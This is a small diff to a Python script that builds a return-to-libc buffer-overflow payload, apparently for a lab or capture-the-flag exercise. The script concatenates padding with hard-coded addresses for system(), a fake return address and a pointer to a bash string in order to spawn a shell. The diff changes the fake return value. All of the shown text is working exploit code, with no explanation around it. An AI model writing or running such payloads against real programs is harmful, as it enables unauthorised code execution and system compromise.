@@ -16,7 +16,7 @@ system_addr = '\x50\x7f\xff\xf7\xa7\x94'
 bash_string_addr = '\x50\xe6\xff\xff\xff\x7f'
 
 syscall = system_addr
-fake_ret = system_addr
+fake_ret = stuff_word
 args = bash_string_addr
 
 print(stuff_buf + syscall + fake_ret + args)
